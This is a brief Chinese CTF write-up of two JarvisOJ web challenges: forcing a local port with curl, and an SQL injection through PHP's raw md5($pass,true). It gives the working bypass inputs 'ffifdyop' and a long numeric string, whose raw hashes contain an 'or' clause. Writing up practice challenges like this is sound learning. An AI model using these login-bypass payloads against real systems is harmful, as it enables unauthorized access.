# 对CTF-Web的记录与总结 #

### 使用本地的某个端口号对网址进行访问 ###

[例题:JarvisOJ PORT51](http://web.jarvisoj.com:32770/)

curl 参数 --local-port RANGE  强制使用的本地端口号

***payload***
`curl --local-port 51 http://web.jarvisoj.com:32770/`

(在做题的时候貌似出了问题 没有回显)

### php中md5($str,true)注入 ###

[例题:JarvisOJ Login](http://web.jarvisoj.com:32772/)

```
Hint: "select * from `admin` where password='".md5($pass,true)."'"
```

关键在于md5函数的第二个参数为true

- TRUE - 原始 16 字符二进制格式
- FALSE - 默认 32 字符十六进制数

例如输入为: `asdf` 时

得到md5为 `912ec803b2ce49e4a541068d495ab570` 这是false的情况

得到的16字符为 `.È²ÎIä¥AIZµp` 这是true的情况

当转换出的字符能够进行sql注入时即可提取flag

当输入为`129581926211651571912466741651878684928`或`ffifdyop`均能得到flag

```
129581926211651571912466741651878684928
md5: 06da5430449f8f6f23dfc1276f722738
ascii: ÚT0Do#ßÁ'or'8
```

```
ffifdyop
md5: 276f722736c95d99e921722cf9ed621c
ascii: 'or'6É]é!r,ùíb
```
